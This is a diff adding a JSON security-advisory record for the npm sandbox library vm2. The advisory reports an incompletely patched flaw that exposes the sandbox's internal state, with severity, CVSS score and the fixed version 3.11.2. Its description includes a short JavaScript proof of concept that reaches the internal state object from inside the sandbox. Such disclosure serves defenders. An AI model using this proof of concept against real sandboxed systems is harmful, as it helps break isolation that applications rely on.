@@ -1,0 +1,49 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-05-08T16:22:53Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 354245,
+    "Id": "GSA_kwCzR0hTQS0yY20yLW0zdzUtZ3AyZs4ABWfF",
+    "GhsaId": "GHSA-2cm2-m3w5-gp2f",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-2cm2-m3w5-gp2f"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2cm2-m3w5-gp2f"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2cm2-m3w5-gp2f"
+      }
+    ],
+    "Description": "### Summary\n\nhttps://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7 is not fully patched.\n\n### Details\n\nIt is still possible to get access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL`.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\n globalThis['VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL']\n`));\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-08T16:22:52Z",
+    "Severity": "MODERATE",
+    "Summary": "vm2 has access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL`",
+    "UpdatedAt": "2026-05-08T16:22:53Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.2"
+      },
+      "VulnerableVersionRange": "\u003c 3.11.2"
+    }
+  ]
+}
